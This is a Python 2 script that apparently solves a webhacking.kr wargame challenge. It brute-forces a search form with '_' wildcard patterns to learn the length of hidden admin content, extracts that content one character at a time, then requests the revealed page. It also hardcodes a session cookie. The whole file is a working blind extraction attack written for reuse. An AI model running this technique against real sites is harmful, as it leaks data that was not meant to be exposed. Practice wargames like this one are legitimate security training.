#-*- coding: utf-8 -*-
import sys
import urllib
import urllib2
import CookieManager

challengeUrl = "http://webhacking.kr/challenge/web/web-33/index.php"
trueCondition  = "admin"

print "[*] Find contents length"
contentsLength = 0
isFoundLength = False

CookieManager.addCookie("PHPSESSID", "e52509baa15ced3a5be56d2efc0239b6")

for contentsLength in range(1, 30):
    parameters = urllib.urlencode({
        "search": "_" * contentsLength
    })
    httpRequest = urllib2.Request(challengeUrl, parameters)
    httpRequest.add_header("Cookie", CookieManager.getCookie())
    
    httpConnection = None
    try:
        httpConnection = urllib2.urlopen(httpRequest)
        httpResponse = httpConnection.read()
        print "[*] Find admin contents length...", contentsLength
        if httpResponse.find(trueCondition) < 0:
            isFoundLength = True
            contentsLength -= 1
            break
    except:
        raise
    finally:
        if httpConnection != None:
            httpConnection.close()

print "[!] FIND IT! admin contents length is [", contentsLength, "]"
if not isFoundLength:
    sys.exit(-1)

adminContents = ""
    
for caretIndex in range(1, contentsLength+1):
    print
    print "[+] Find admin contents...", caretIndex, "", 
    for charIndex in range(0x61, 0x7f) + range(0x20, 0x41):
        if chr(charIndex) == '%' or chr(charIndex) == '_':
            continue
        sys.stdout.write(".")
        parameters = urllib.urlencode({
            "search": adminContents + chr(charIndex) + "_" * (contentsLength-caretIndex)
        })
        httpRequest = urllib2.Request(challengeUrl, parameters)
        httpRequest.add_header("Cookie", CookieManager.getCookie())
        
        httpConnection = None
        try:
            httpConnection = urllib2.urlopen(httpRequest)
            httpResponse = httpConnection.read()
            if httpResponse.find(trueCondition) >= 0:
                sys.stdout.write(" " + chr(charIndex))
                adminContents += chr(charIndex)
                isFoundLength = True
                contentsLength -= 1
                break
        except:
            raise
        finally:
            if httpConnection != None:
                httpConnection.close()

print
print "[!] admin contents is [", adminContents, "]"

challengeUrl = "http://webhacking.kr/challenge/web/web-33/" + adminContents

print "[*] Clear Challenge 56"
contentsLength = 0
isFoundLength = False

CookieManager.addCookie("PHPSESSID", "e52509baa15ced3a5be56d2efc0239b6")

httpRequest = urllib2.Request(challengeUrl)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

